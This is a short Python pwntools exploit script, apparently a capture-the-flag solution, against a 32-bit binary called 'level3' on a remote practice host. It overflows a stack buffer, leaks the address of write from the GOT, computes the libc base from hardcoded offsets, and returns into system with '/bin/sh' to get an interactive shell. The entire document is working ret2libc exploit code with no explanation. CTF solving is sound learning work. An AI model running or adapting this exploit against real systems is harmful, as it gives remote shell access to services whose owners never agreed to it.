from pwn import *


p = remote("node4.buuoj.cn", 29911)
pro = ELF("./level3")


write_p = pro.plt["write"]
write_g = pro.got["write"]
start = 0x08048350


def leak():
    p.recv()
    pad = cyclic(0x88+0x4)
    pad += p32(write_p)+p32(start)
    pad += p32(1)+p32(write_g)+p32(4)
    p.send(pad)
    info = p.recvuntil("Input", drop=True)

    return info


info = u32(leak().ljust(4, b"\x00"))
print(hex(info))

# count offset
base = info-0xd43c0
system = base+0x3a940
binsh = base+0x15902b

# attack
pad = cyclic(0x88+0x4)
pad += p32(system)+p32(0)+p32(binsh)
p.send(pad)

p.interactive()


